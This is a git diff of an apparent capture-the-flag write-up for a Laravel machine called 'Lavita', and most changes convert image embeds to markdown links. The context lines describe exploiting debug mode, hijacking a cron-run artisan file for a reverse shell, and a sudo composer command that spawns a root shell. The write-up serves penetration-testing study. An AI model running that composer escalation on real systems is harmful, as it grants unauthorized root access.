@@ -70,17 +70,17 @@ Output revealed `/login` and `/register`.
 
 Registered a new account to access the dashboard:
 
-![[Pasted image 20251106205744.png]]
+![Pasted image 20251106205744.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106205744.png)
 
 **Step 3:** Information Disclosure via Debug Mode
 
 While testing functionality, I noticed an interesting behavior in the image upload feature. More importantly, triggering an error reveals that **Laravel Debug Mode** is enabled.
 
-![[Pasted image 20251106205908.png]]
+![Pasted image 20251106205908.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106205908.png)
 
 A 404 error page confirms the technology stack details:
 
-![[Pasted image 20251106205928.png]]
+![Pasted image 20251106205928.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106205928.png)
 
 <div class="divider divider-info">
     <span class="divider-title">Laravel Debug Mode</span>
@@ -152,7 +152,7 @@ chmod +x pspy64
 
 A recurring task appears every minute:
 
-![[Pasted image 20251106210224.png]]
+![Pasted image 20251106210224.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106210224.png)
 
 The command `php artisan clear:pictures` is being executed by a user (likely `skunk` or root).
 
@@ -180,11 +180,11 @@ The file is writable by `www-data`!
 
 Original file content:
 
-![[Pasted image 20251106210608.png]]
+![Pasted image 20251106210608.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106210608.png)
 
 I modified the file to execute a reverse shell instead of the cleanup command:
 
-![[Pasted image 20251106210621.png]]
+![Pasted image 20251106210621.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106210621.png)
 
 ```php
 <?php
@@ -218,7 +218,7 @@ uid=1000(skunk) gid=1000(skunk) groups=1000(skunk)
 
 **Step 1:** Check sudo permissions
 
-![[Pasted image 20251106210734.png]]
+![Pasted image 20251106210734.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106210734.png)
 
 ```bash
 sudo -l
@@ -248,9 +248,9 @@ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json
 sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
 ```
 
-![[Pasted image 20251106211058.png]]
+![Pasted image 20251106211058.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106211058.png)
 
-![[Pasted image 20251106211115.png]]
+![Pasted image 20251106211115.png](/assets/images/2025-11-06-Lavita/Pasted image 20251106211115.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Root Access</span>
